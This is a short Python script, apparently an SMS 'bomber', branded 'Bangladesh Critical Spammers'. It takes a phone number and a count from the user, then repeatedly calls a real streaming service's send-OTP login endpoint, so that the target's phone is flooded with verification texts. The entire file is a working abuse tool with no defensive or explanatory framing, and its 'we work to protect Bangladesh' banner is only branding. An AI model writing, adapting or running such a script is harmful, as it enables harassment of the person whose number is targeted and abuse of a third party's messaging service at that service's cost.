bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White





















import requests
print (bgreen+"                 BANGLADESH CRITICAL SPAMMERS")


number=str(input(" Enter The Number : "))



amount=int(input(" Enter The Amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
print (bred+"                  WE WORK TO PROTECT BANGLADESH")

for i in range(amount):
	requests.get(api)
	
	
	print(str(i+1)+"  মেসেজ হানদাইসে")